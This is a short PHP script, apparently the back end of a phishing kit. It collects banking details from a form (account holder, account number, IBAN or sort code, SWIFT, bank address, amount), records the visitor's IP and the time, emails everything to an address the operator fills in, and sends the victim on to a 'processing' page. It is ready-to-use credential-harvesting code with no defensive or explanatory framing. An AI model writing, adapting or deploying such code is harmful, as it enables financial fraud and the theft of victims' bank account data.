<?php
$your_email = "#"; // put your email here

$amount = $_POST['amount1'];
$bname = $_POST['Bank_Name'];
$badd = $_POST['bank_addres'];
$bcity = $_POST['bank_city'];
$bstate = $_POST['bank_state'];
$bcountry = $_POST['bank_country'];
$achname = $_POST['account_name'];
$acn = $_POST['account_number'];
$iban = $_POST['sort_code'];
$swift = $_POST['SWIFT'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$msg = "
Amount : $amount 
Bank Name : $bname
Bank Address : $badd
Bank City : $bcity
Bank State : $bstate
Bank Country : $bcountry
Account Holder Name : $achname
Account Number : $acn
IBAN : $iban
SWIFT : $swift

IP Address : $ip 
Date Submitted : $today
";

mail($your_email,"Transfer_info", $msg);
header('Location:processing1.html');
?>